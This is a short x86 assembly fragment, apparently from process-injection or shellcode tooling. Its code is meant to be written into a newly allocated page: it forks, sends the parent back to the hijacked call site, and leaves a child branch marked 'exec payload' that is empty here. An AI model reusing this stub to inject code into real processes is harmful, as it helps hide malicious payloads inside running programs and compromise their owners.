; This is the code that will be placed in the newly allocated page

BITS 32

	; 
	;fork spawn
	;
 
	xor eax,eax
	inc eax
	inc eax
	int 0x80	; call fork
	test eax,eax
	jnz child


	popa		; parent return
	sub dword [esp],5	; length of original call
	add esp,4	
	jmp [esp-4] 
child:
	; exec payload
